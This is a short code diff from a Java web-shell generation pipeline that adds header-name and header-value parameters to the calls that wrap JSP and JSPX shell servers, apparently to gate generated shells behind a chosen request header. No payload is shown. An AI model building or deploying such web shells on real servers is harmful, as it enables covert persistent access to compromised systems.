@@ -46,17 +46,21 @@ public final class WebShellGenerationPipeline {
         if (jsp) {
             if (request.getProtocol() == TransportProtocol.HTTP_CHUNK) {
                 return new org.leo.jmg.jsp.httpchunk.JspServer().wrap(
-                        request.getCoreClassName(), coreClass, request.getResponseCode());
+                        request.getCoreClassName(), coreClass, request.getResponseCode(),
+                        request.getHeaderName(), request.getHeaderValue());
             }
             return new JspServer().wrap(
-                    request.getCoreClassName(), coreClass, request.getResponseCode());
+                    request.getCoreClassName(), coreClass, request.getResponseCode(),
+                    request.getHeaderName(), request.getHeaderValue());
         }
         if (request.getProtocol() == TransportProtocol.HTTP_CHUNK) {
             return new org.leo.jmg.jsp.httpchunk.JspxServer().wrap(
-                    request.getCoreClassName(), coreClass, request.getResponseCode());
+                    request.getCoreClassName(), coreClass, request.getResponseCode(),
+                    request.getHeaderName(), request.getHeaderValue());
         }
         return new JspxServer().wrap(
-                request.getCoreClassName(), coreClass, request.getResponseCode());
+                request.getCoreClassName(), coreClass, request.getResponseCode(),
+                request.getHeaderName(), request.getHeaderValue());
     }
 
     private JspObfuscationPipeline buildObfuscationPipeline(boolean jsp) {
